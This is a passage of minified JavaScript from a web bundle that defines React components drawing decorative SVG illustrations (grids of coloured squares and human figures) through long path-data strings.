300.926v3.086h3.087v6.173h-3.087v3.087h7.716v-12.346h-7.716zM499.228 395.062v3.086h3.087v6.173h-3.087v3.086h7.716v-12.345h-7.716zM391.204 373.457v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM391.204 393.519v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM351.08 160.494v3.086h3.087v6.173h-3.087v3.087h7.716v-12.346h-7.716zM351.08 239.198v3.086h3.087v6.173h-3.087v3.086h7.716v-12.345h-7.716zM351.08 259.259v3.087h3.087v6.173h-3.087v3.086h7.716v-12.346h-7.716zM351.08 299.383v3.086h3.087v6.173h-3.087v3.086h7.716v-12.345h-7.716zM351.08 356.481v3.087h3.087v6.173h-3.087v3.086h7.716v-12.346h-7.716zM351.08 373.457v3.086h3.087v6.173h-3.087v3.086h7.716v-12.345h-7.716zM431.327 66.358h7.716v12.346h-7.716zM431.327 86.42h7.716v12.346h-7.716zM428.241 108.025h10.802v1.543h-10.802zM428.241 206.79h10.802v1.543h-10.802zM428.241 223.765h10.802v1.543h-10.802zM431.327 121.914V125h3.087v6.173h-3.087v3.086h7.716v-12.345h-7.716zM431.327 160.494v3.086h3.087v6.173h-3.087v3.087h7.716v-12.346h-7.716zM431.327 239.198v3.086h3.087v6.173h-3.087v3.086h7.716v-12.345h-7.716zM519.29 200.617h7.716v12.346h-7.716zM519.29 220.679h7.716v12.346h-7.716zM516.204 242.284h10.802v1.543h-10.802zM516.204 341.049h10.802v1.543h-10.802zM516.204 358.025h10.802v1.543h-10.802zM519.29 256.173v3.086h3.087v6.173h-3.087v3.087h7.716v-12.346h-7.716zM519.29 294.753v3.087h3.087v6.172h-3.087v3.087h7.716v-12.346h-7.716zM519.29 373.457v3.086h3.087v6.173h-3.087v3.086h7.716v-12.345h-7.716zM543.981 66.358h7.716v12.346h-7.716zM570.216 63.272h7.716v12.346h-7.716zM584.105 63.272h7.716v12.346h-7.716zM584.105 100.309h7.716v12.346h-7.716zM599.537 81.79h7.716v12.346h-7.716zM599.537 101.852h7.716v12.346h-7.716zM584.105 140.432h7.716v12.346h-7.716zM599.537 160.494h7.716v12.346h-7.716zM584.105 236.111h7.716v12.346h-7.716zM570.216 160.494h7.716v12.346h-7.716zM543.981 86.42h7.716v12.346h-7.716zM543.981 279.321h7.716v12.346h-7.716zM543.981 319.444h7.716v12.346h-7.716zM543.981 339.506h7.716v12.346h-7.716zM540.895 108.025h10.802v1.543h-10.802zM582.562 126.543h10.802v1.543h-10.802zM540.895 206.79h10.802v1.543h-10.802zM540.895 223.765h10.802v1.543h-10.802zM582.562 322.531h10.802v1.543h-10.802zM570.216 359.568h10.802v1.543h-10.802zM543.981 121.914V125h3.087v6.173h-3.087v3.086h7.717v-12.345h-7.717zM570.216 100.309v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM599.537 120.37v3.087h3.086v6.173h-3.086v3.086h7.716V120.37h-7.716zM599.537 180.556v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM599.537 200.617v3.087h3.086v6.173h-3.086v3.086h7.716v-12.346h-7.716zM599.537 138.889v3.086h3.086v6.173h-3.086v3.087h7.716v-12.346h-7.716zM584.105 81.79v3.087h3.086v6.172h-3.086v3.087h7.716V81.79h-7.716zM584.105 180.556h7.716v12.346h-7.716zM584.105 217.593h7.716v12.346h-7.716zM584.105 199.074v3.086h3.086v6.173h-3.086v3.087h7.716v-12.346h-7.716zM570.216 120.37v3.087h3.086v6.173h-3.086v3.086h7.716V120.37h-7.716zM570.216 140.432v3.087h3.086v6.172h-3.086v3.087h7.716v-12.346h-7.716zM570.216 200.617h7.716v12.346h-7.716zM570.216 180.556v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM570.216 240.741h7.716v12.346h-7.716zM570.216 220.679v3.086h3.086v6.173h-3.086v3.087h7.716v-12.346h-7.716zM570.216 280.864h7.716v12.346h-7.716zM584.105 277.778h7.716v12.346h-7.716zM570.216 260.802v3.087h3.086v6.173h-3.086v3.086h7.716v-12.346h-7.716zM599.537 260.802v3.087h3.086v6.173h-3.086v3.086h7.716v-12.346h-7.716zM678.241 81.79h7.716v12.346h-7.716zM678.241 101.852h7.716v12.346h-7.716zM678.241 160.494h7.716v12.346h-7.716zM678.241 120.37v3.087h3.086v6.173h-3.086v3.086h7.716V120.37h-7.716zM678.241 180.556v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM678.241 200.617v3.087h3.086v6.173h-3.086v3.086h7.716v-12.346h-7.716zM678.241 138.889v3.086h3.086v6.173h-3.086v3.087h7.716v-12.346h-7.716zM678.241 260.802v3.087h3.086v6.173h-3.086v3.086h7.716v-12.346h-7.716zM570.216 320.988h7.716v12.346h-7.716zM584.105 297.84h7.716v12.346h-7.716zM570.216 373.457h7.716v12.346h-7.716zM584.105 336.42h7.716v12.346h-7.716zM570.216 300.926v3.086h3.086v6.173h-3.086v3.087h7.716v-12.346h-7.716zM570.216 395.062v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM655.093 63.272h7.716v12.346h-7.716zM655.093 160.494h7.716v12.346h-7.716zM655.093 359.568h10.802v1.543h-10.802zM655.093 100.309v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM655.093 120.37v3.087h3.086v6.173h-3.086v3.086h7.716V120.37h-7.716zM655.093 140.432v3.087h3.086v6.172h-3.086v3.087h7.716v-12.346h-7.716zM655.093 200.617h7.716v12.346h-7.716zM655.093 180.556v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM655.093 240.741h7.716v12.346h-7.716zM655.093 220.679v3.086h3.086v6.173h-3.086v3.087h7.716v-12.346h-7.716zM655.093 280.864h7.716v12.346h-7.716zM655.093 260.802v3.087h3.086v6.173h-3.086v3.086h7.716v-12.346h-7.716zM655.093 320.988h7.716v12.346h-7.716zM655.093 373.457h7.716v12.346h-7.716zM655.093 300.926v3.086h3.086v6.173h-3.086v3.087h7.716v-12.346h-7.716zM655.093 395.062v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM692.13 63.272h7.716v12.346h-7.716zM692.13 160.494h7.716v12.346h-7.716zM692.13 359.568h10.802v1.543H692.13zM692.13 100.309v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM692.13 120.37v3.087h3.086v6.173h-3.086v3.086h7.716V120.37h-7.716zM692.13 140.432v3.087h3.086v6.172h-3.086v3.087h7.716v-12.346h-7.716zM692.13 200.617h7.716v12.346h-7.716zM692.13 180.556v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM692.13 240.741h7.716v12.346h-7.716zM692.13 220.679v3.086h3.086v6.173h-3.086v3.087h7.716v-12.346h-7.716zM692.13 280.864h7.716v12.346h-7.716zM692.13 260.802v3.087h3.086v6.173h-3.086v3.086h7.716v-12.346h-7.716zM692.13 320.988h7.716v12.346h-7.716zM692.13 373.457h7.716v12.346h-7.716zM692.13 300.926v3.086h3.086v6.173h-3.086v3.087h7.716v-12.346h-7.716zM692.13 395.062v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM584.105 373.457v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM584.105 393.519v3.086h3.086v6.173h-3.086v3.086h7.716v-12.345h-7.716zM543.981 160.494v3.086h3.087v6.173h-3.087v3.087h7.717v-12.346h-7.717zM543.981 239.198v3.086h3.087v6.173h-3.087v3.086h7.717v-12.345h-7.717zM543.981 259.259v3.087h3.087v6.173h-3.087v3.086h7.717v-12.346h-7.717zM543.981 299.383v3.086h3.087v6.173h-3.087v3.086h7.717v-12.345h-7.717zM543.981 356.481v3.087h3.087v6.173h-3.087v3.086h7.717v-12.346h-7.717zM543.981 373.457v3.086h3.087v6.173h-3.087v3.086h7.717v-12.345h-7.717zM624.228 66.358h7.716v12.346h-7.716zM624.228 86.42h7.716v12.346h-7.716zM621.142 108.025h10.802v1.543h-10.802zM621.142 206.79h10.802v1.543h-10.802zM621.142 223.765h10.802v1.543h-10.802zM624.228 121.914V125h3.087v6.173h-3.087v3.086h7.716v-12.345h-7.716zM624.228 160.494v3.086h3.087v6.173h-3.087v3.087h7.716v-12.346h-7.716zM624.228 239.198v3.086h3.087v6.173h-3.087v3.086h7.716v-12.345h-7.716zM712.191 200.617h7.716v12.346h-7.716zM712.191 220.679h7.716v12.346h-7.716zM709.105 242.284h10.802v1.543h-10.802zM709.105 341.049h10.802v1.543h-10.802zM709.105 358.025h10.802v1.543h-10.802zM712.191 256.173v3.086h3.087v6.173h-3.087v3.087h7.716v-12.346h-7.716zM712.191 294.753v3.087h3.087v6.172h-3.087v3.087h7.716v-12.346h-7.716zM712.191 373.457v3.086h3.087v6.173h-3.087v3.086h7.716v-12.345h-7.716z"})),i||(i=u.createElement("path",{fill:"#2f2e41",d:"M214.435 706.534h827.604v2.554H214.435zM385.5 404.34v52l7 32s-1 20 0 26-1 16-7 16-9 15-9 15-2 6-7 7-5 0-5 0l-4 10-83 55 16 40s25-9 27-12 19 4 19-3 3-25 9-26 56-24 56-24 26-29 28-40 11-42 11-42l25 42v84l-4 45 44-6s-4-28 0-32 10-52 6-58 2-33 0-37-1-33-6-41-35-90-35-90Z"})),o||(o=u.createElement("path",{d:"M470.5 679.34s-15 25-5 28 29 0 31 0 38 1 38 1 24-5 24-12-15-7-20-8-36-13-36-13ZM282.093 618.468s-28.903-3.828-27.681 6.54 11.527 26.612 12.321 28.447c.539 1.243 6.855 16.978 10.876 27.006a58.476 58.476 0 0 0 12.835 19.652c3.931 3.929 8.216 7.08 11.026 5.862 6.424-2.782.462-16.547-.608-21.532s-2.38-38.202-2.38-38.202Z",fill:"#2f2e41"})),l||(l=u.createElement("path",{d:"m483 238.84 32-74s-3-7-10-6c0 0-9.5-24.5-27.5-24.5 0 0-27-15-35 0 0 0-17 15-16 29s2 24 2 24-16 2-13 10 4 8 0 11l-4 3s-83 75-37 185l4 17v16s101 1 101 0-2-7 2-11 4-10 4-10-4-20-2-26 3-32-1-38-2-54-2-54l9-17-3-10-3-10Z",fill:"#8985a8"})),n||(n=u.createElement("path",{d:"M474.5 439.34s-12-33-11-39-2-18-2-18l-4-81s17-72-21-84c0 0-9.615 4.195-17.494 17.697-7.79 3.47-17.244 12.252-19.506 34.303-4 39 14 139 23 156s15 29 15 29l9.406-4.181c.389.77.594 1.18.594 1.18Z",opacity:.1})),s||(s=u.createElement("circle",{cx:480,cy:226.84,r:3,fill:"#f2f2f2"})),c||(c=u.createElement("path",{fill:"#3f3d56",d:"M479 226.84h2v47h-2z"})),d||(d=u.createElement("path",{d:"m444 442.84 8 17s18-6 18-9-8-16-8-16Z",fill:"#ffb8b8"})),f||(f=u.createElement("path",{d:"M432.5 217.34s-23 10-27 49 14 139 23 156 15 29 15 29l27-12s-12-33-11-39-2-18-2-18l-4-81s17-72-21-84Z",fill:"#8985a8"})))}},181:(e,t,a)=>{a.d(t,{Z:()=>le});var h,r,i,o,l,n,s,c,d,f,u,v,m,p,g,y,b,w,M,z,x,E,q,k,Z,T,G,I,F,S,A,P,H,O,C,L,D,V,_,N,W,j,R,B,U,Q,Y,J,K,X,$,ee,te,ae,he,re,ie=a(7294);function oe(){return oe=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var a=arguments[t];for(var h in a)Object.prototype.hasOwnProperty.call(a,h)&&(e[h]=a[h])}return e},oe.apply(this,arguments)}const le=e=>{let{title:t,titleId:a,...le}=e;return ie.createElement("svg",oe({"data-name":"Layer 1",xmlns:"http://www.w3.org/2000/svg",width:850.538,height:740.83,viewBox:"0 0 850.538 740.83","aria-labelledby":a},le),t?ie.createElement("title",{id:a},t):null,h||(h=ie.createElement("path",{d:"M766.878 385.54a354.21 354.21 0 0 1-98.85 245.9q-5.745 6.015-11.8 11.74-9.225 8.775-19.07 16.87a353.934 353.934 0 0 1-217.58 80.69q-3.975.09-7.98.09c-63.43 0-143.21-33.88-215.61-80.78q-8.985-5.82-17.81-11.91-4.125-2.82-8.21-5.72a730.43 730.43 0 0 1-79.32-64.8 514.116 514.116 0 0 1-45.75-48.92c-55.63-68.62-67.9-130.45 11.41-143.16q14.085-2.25 27.34-4.81 19.2-3.69 36.75-7.97 23.64-5.745 44.42-12.46 6.99-2.25 13.66-4.59c65.74-23.09 109.74-53.2 139.69-85.87q7.62-8.295 14.05-16.79a236.055 236.055 0 0 0 17.83-27.12 254.898 254.898 0 0 0 18.41-41.05l.27-.78c23.83-68.74 16.58-132.5 42.87-153.84 112.38-91.23 252.29 38.69 317.96 191.9q4.965 11.58 9.34 23.3 1.965 5.235 3.79 10.49 4.8 13.694 8.71 27.46 1.5 5.25 2.86 10.49c.97 3.77 1.9 7.53 2.76 11.29 6.39 27.53 9.86 54.68 9.86 80.35Z",fill:"#f2f2f2"})),r||(r=ie.createElement("path",{d:"M419.578 740.74q-3.975.09-7.98.09c-63.43 0-143.21-33.88-215.61-80.78q-8.985-5.82-17.81-11.91l5.16-31.4L339.548 596l78.4 59.95Z",fill:"#2f2e41"})),i||(i=ie.createElement("path",{d:"M427.098 180.05h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.27a2.593 2.593 0 0 0 2.6 2.59h22.26a2.6 2.6 0 0 0 2.6-2.59v-22.27a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#fff"})),o||(o=ie.createElement("path",{d:"M427.098 218h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.27a2.593 2.593 0 0 0 2.6 2.59h22.26a2.6 2.6 0 0 0 2.6-2.59V220.6a2.608 2.608 0 0 0-2.6-2.6ZM427.098 255.95h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.608 2.608 0 0 0-2.6-2.6ZM429.658 296.04a2.617 2.617 0 0 0-2.56-2.14h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6V296.5a2.313 2.313 0 0 0-.04-.46ZM428.108 332.05a2.634 2.634 0 0 0-1.01-.2h-22.26a2.595 2.595 0 0 0-2.6 2.6v22.26a2.588 2.588 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.616 2.616 0 0 0-1.59-2.4ZM473.858 180.05h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.27a2.593 2.593 0 0 0 2.6 2.59h22.26a2.6 2.6 0 0 0 2.6-2.59v-22.27a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),l||(l=ie.createElement("path",{d:"M473.858 218h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.27a2.593 2.593 0 0 0 2.6 2.59h22.26a2.6 2.6 0 0 0 2.6-2.59V220.6a2.608 2.608 0 0 0-2.6-2.6ZM473.858 255.95h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.608 2.608 0 0 0-2.6-2.6ZM473.858 293.9h-22.26a2.593 2.593 0 0 0-2.46 1.78 2.478 2.478 0 0 0-.14.82v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6V296.5a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#4361ee"})),n||(n=ie.createElement("path",{d:"M473.858 331.85h-22.26a2.595 2.595 0 0 0-2.6 2.6v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.601 2.601 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),s||(s=ie.createElement("path",{d:"M520.618 180.05h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.27a2.593 2.593 0 0 0 2.6 2.59h22.26a2.6 2.6 0 0 0 2.6-2.59v-22.27a2.608 2.608 0 0 0-2.6-2.6ZM520.618 218h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.27a2.593 2.593 0 0 0 2.6 2.59h22.26a2.6 2.6 0 0 0 2.6-2.59V220.6a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#4361ee"})),c||(c=ie.createElement("path",{d:"M520.618 255.95h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),d||(d=ie.createElement("path",{d:"M520.618 293.9h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6V296.5a2.608 2.608 0 0 0-2.6-2.6ZM520.618 331.85h-22.26a2.595 2.595 0 0 0-2.6 2.6v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.601 2.601 0 0 0-2.6-2.6ZM567.378 180.05h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.27a2.593 2.593 0 0 0 2.6 2.59h22.26a2.6 2.6 0 0 0 2.6-2.59v-22.27a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#4361ee"})),f||(f=ie.createElement("path",{d:"M567.378 218h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.27a2.593 2.593 0 0 0 2.6 2.59h22.26a2.6 2.6 0 0 0 2.6-2.59V220.6a2.608 2.608 0 0 0-2.6-2.6ZM567.378 255.95h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#fff"})),u||(u=ie.createElement("path",{d:"M567.378 293.9h-22.26a2.601 2.601 0 0 0-2.6 2.6v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6V296.5a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),v||(v=ie.createElement("path",{d:"M567.378 331.85h-22.26a2.595 2.595 0 0 0-2.6 2.6v22.26a2.595 2.595 0 0 0 2.6 2.6h22.26a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.601 2.601 0 0 0-2.6-2.6Z",fill:"#4361ee"})),m||(m=ie.createElement("path",{d:"M614.138 180.05h-22.27a2.599 2.599 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59v-22.27a2.608 2.608 0 0 0-2.6-2.6ZM614.138 218h-22.27a2.599 2.599 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59V220.6a2.608 2.608 0 0 0-2.6-2.6ZM614.138 255.95h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#fff"})),p||(p=ie.createElement("path",{d:"M614.138 293.9h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6V296.5a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#4361ee"})),g||(g=ie.createElement("path",{d:"M614.138 331.85h-22.27a2.593 2.593 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.601 2.601 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),y||(y=ie.createElement("path",{d:"M660.898 180.05h-22.27a2.599 2.599 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59v-22.27a2.608 2.608 0 0 0-2.6-2.6ZM660.898 218h-22.27a2.599 2.599 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59V220.6a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#fff"})),b||(b=ie.createElement("path",{d:"M660.898 255.95h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#4361ee"})),w||(w=ie.createElement("path",{d:"M660.898 293.9h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6V296.5a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),M||(M=ie.createElement("path",{d:"M660.898 331.85h-22.27a2.593 2.593 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.601 2.601 0 0 0-2.6-2.6Z",fill:"#fff"})),z||(z=ie.createElement("path",{d:"M707.658 180.05h-22.27a2.599 2.599 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59v-22.27a2.608 2.608 0 0 0-2.6-2.6ZM707.658 218h-22.27a2.599 2.599 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59V220.6a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#4361ee"})),x||(x=ie.createElement("path",{d:"M707.658 255.95h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),E||(E=ie.createElement("path",{d:"M707.658 293.9h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6V296.5a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#fff"})),q||(q=ie.createElement("path",{d:"M707.658 331.85h-22.27a2.593 2.593 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.601 2.601 0 0 0-2.6-2.6ZM754.418 180.05h-22.27a2.599 2.599 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59v-22.27a2.608 2.608 0 0 0-2.6-2.6ZM754.418 218h-22.27a2.599 2.599 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59V220.6a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#4361ee"})),k||(k=ie.createElement("path",{d:"M754.418 255.95h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),Z||(Z=ie.createElement("path",{d:"M754.418 293.9h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6V296.5a2.608 2.608 0 0 0-2.6-2.6ZM754.418 331.85h-22.27a2.593 2.593 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.601 2.601 0 0 0-2.6-2.6Z",fill:"#4361ee"})),T||(T=ie.createElement("path",{d:"M801.178 180.05h-22.27a2.599 2.599 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59v-22.27a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),G||(G=ie.createElement("path",{d:"M801.178 218h-22.27a2.599 2.599 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59V220.6a2.608 2.608 0 0 0-2.6-2.6ZM801.178 255.95h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.608 2.608 0 0 0-2.6-2.6ZM801.178 293.9h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6V296.5a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#4361ee"})),I||(I=ie.createElement("path",{d:"M801.178 331.85h-22.27a2.593 2.593 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.601 2.601 0 0 0-2.6-2.6ZM847.938 180.05h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59v-22.27a2.608 2.608 0 0 0-2.6-2.6ZM847.938 218h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.27a2.59 2.59 0 0 0 2.59 2.59h22.27a2.6 2.6 0 0 0 2.6-2.59V220.6a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),F||(F=ie.createElement("path",{d:"M847.938 255.95h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.608 2.608 0 0 0-2.6-2.6Z",fill:"#4361ee"})),S||(S=ie.createElement("path",{d:"M847.938 293.9h-22.27a2.6 2.6 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6V296.5a2.608 2.608 0 0 0-2.6-2.6ZM847.938 331.85h-22.27a2.593 2.593 0 0 0-2.59 2.6v22.26a2.593 2.593 0 0 0 2.59 2.6h22.27a2.601 2.601 0 0 0 2.6-2.6v-22.26a2.601 2.601 0 0 0-2.6-2.6Z",fill:"#e6e6e6"})),A||(A=ie.createElement("path",{fill:"#2f2e41",d:"M336.095 660.051h-.62l.53-.07.09.07z"})),P||(P=ie.createElement("circle",{"data-name":"ab6171fa-7d69-4734-b81c-8dff60f9761b",cx:282.814,cy:176.733,r:68.322,fill:"#ffb6b6"})),H||(H=ie.createElement("path",{"data-name":"bf427902-b9bf-4946-b5d7-5c1c7e04535e",d:"M342.646 126.64s17.87-34.16-21.444-37.266c0 0-33.515-30.402-67.676-5.558 0 0-18.633 0-28.822 21.086 0 0-14.655-5.558-17.876 9.316 0 0-10.723 31.056 0 59.005 10.724 27.95 14.286 31.056 14.286 31.056s-17.621-58.599 25.27-61.704 90.886-29.91 94.46 4.251 8.954 42.578 8.954 42.578 33.95-48.789-7.152-62.764Z",fill:"#2f2e41"})),O||(O=ie.createElement("path",{d:"m459.548 345.11-.22 1.16-2.47 13.04-17.07 90.2-1.01 5.31-2.12 11.23-2.9 15.32-6.43 33.95-1.84 9.73-.69 3.65-.24 1.28-1.91 10.07-.58 3.04-4.66 34.53-4.07 30.09 13.62 13.62-8.12 8.12-5.33 30.53.01.07h-217.53q-13.2-8.55-26.02-17.63l1.79-13.4s6.16-23.93 3.57-26.79c-2.58-2.86-8.24-7.97-8.24-7.97l7.13-16.64.99-2.31-1.66-34.43-.04-.83-.55-11.35-.07-1.46-.11-2.19-2.11-43.68-.04-.72-.64-13.24-.6-12.59-.26-5.31-2.57-53.13-1.74-36.08-1.52-31.41 6.11-2.07 65.35-22.21 27.07-35.19 56.34.42 27.58.21 46.02 42.68 10.47 5 .08.04 7.51 3.59 19.04 9.09 20.13 9.62 10.33 4.93Z",fill:"#cacaca"})),C||(C=ie.createElement("path",{d:"M269.109 557.55a30.286 30.286 0 0 1-40.664-22.43l-106.559-15.117 37.043-41.902 95.511 20.78a30.45 30.45 0 0 1 14.669 58.67Z",fill:"#ffb6b6"})),L||(L=ie.createElement("path",{d:"M221.598 481.37a13.522 13.522 0 0 0-7.89-4.87l-43.72-9.09-4.49-.93a18.933 18.933 0 0 1-12.53-9.07 19.16 19.16 0 0 1-2.45-7.9 18.895 18.895 0 0 1 .89-7.48l15.15-45.65 9.83-29.62a41.792 41.792 0 0 0 2.09-11.05 43.349 43.349 0 0 0-9.07-28.89 42.693 42.693 0 0 0-49.01-13.64c-.25.09-.51.19-.76.29a42.583 42.583 0 0 0-25.31 28.41l-10.68 38.85-22.03 80.09a57.766 57.766 0 0 0 48.96 72.68l62.97 7.38 29.14 3.42a13.497 13.497 0 0 0 14.84-10.73 4.895 4.895 0 0 0 .11-.55l.7-4.32 5.93-36.38.06-.37a13.475 13.475 0 0 0-2.73-10.58Z",fill:"#cacaca"})),D||(D=ie.createElement("path",{d:"M336.983 558.717a30.286 30.286 0 0 0 37.094-27.94l103.362-29.994-42.581-36.26-91.627 34.042a30.45 30.45 0 0 0-6.248 60.152Z",fill:"#ffb6b6"})),V||(V=ie.createElement("path",{d:"m528.758 433.69-49.16-113.14a42.819 42.819 0 0 0-20.27-21.35 43.356 43.356 0 0 0-8.78-3.2c-.47-.12-.94-.23-1.41-.32a42.132 42.132 0 0 0-19.48.36 42.814 42.814 0 0 0-27.34 21.73 1.004 1.004 0 0 0-.08.14 43.1 43.1 0 0 0-.37 38.85l.61 1.22 34.74 69.77a18.9 18.9 0 0 1-10.5 